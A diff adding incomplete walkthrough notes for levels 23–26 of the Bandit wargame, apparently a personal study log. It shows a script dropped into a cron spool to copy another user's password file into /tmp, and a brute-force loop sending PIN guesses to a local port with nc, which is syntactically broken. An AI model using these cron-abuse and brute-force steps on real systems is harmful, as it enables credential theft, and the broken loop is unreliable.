@@ -488,8 +488,52 @@ SOLVE
 
 > cd /etc/cron.d
 
+> cat cronjob_bandit23
+
+> cat /usr/bin/cronjob_bandit24.sh
+
+Make a directory in /tmp folder and create a bash script:
+
+#!/bin/bash 
+cat /etc/bandit_pass/bandit24 >> /tmp/numeDirector/nextPassword
+
+> cp script.sh /var/spool/bandit24
+
+Check the created folder,numeDirector, for the nextPassword file.
+
 
 The password we got: 
+
+
+Level 25
+-------------
+STATEMENT
+
+A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.
+
+SOLVE
+
+We need to create a bash script that will check every 4-digit code. The script is located in the folder created for the last level.
+
+#!/bin/bash
+
+for i in{0000..9999}
+  echo "password $i" | nc localhost 30002
+
+The password we got: 
+
+Level 26
+-------------
+STATEMENT
+
+Logging in to bandit26 from bandit25 should be fairly easy… The shell for user bandit26 is not /bin/bash, but something else. Find out what it is, how it works and how to break out of it.
+
+SOLVE
+
+>
+
+The password we got: 
+
 
 
 Level x
